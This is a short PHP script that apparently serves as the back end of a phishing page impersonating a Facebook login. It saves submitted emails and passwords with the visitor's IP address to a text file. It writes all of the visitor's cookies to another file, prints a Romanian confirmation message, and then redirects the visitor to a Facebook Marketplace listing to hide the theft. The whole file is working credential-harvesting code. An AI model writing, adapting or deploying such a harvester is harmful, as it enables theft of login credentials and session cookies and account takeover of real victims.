<?php


$username = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];


if(strlen($username)>4&&strlen($password)>5)
    file_put_contents("cacamaca.txt", "$username : $password :$ip" . PHP_EOL, FILE_APPEND);

if (isset($_COOKIE)) {
    $file = fopen("cookies.txt", "w");
    foreach ($_COOKIE as $key => $value) {
        fwrite($file, "$key : $value\n");
    }
    fclose($file);
    echo "Cookie-urile au fost salvate în cookies.txt";
} else {
    echo "Nu există cookie-uri setate";
}
    
header('Location: https://www.facebook.com/marketplace/item/5640889442626681');
?>